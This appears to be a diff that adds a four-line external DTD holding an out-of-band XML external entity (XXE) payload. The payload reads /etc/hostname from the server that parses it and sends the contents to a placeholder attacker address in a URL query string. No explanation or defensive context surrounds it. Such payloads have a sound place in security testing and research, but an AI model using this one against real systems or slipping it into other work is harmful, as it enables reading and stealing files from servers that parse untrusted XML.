@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % all "<!ENTITY &#37; exfil SYSTEM 'https://<attackers_ip>/?c=%file;'>">
+%all;
+%exfil;
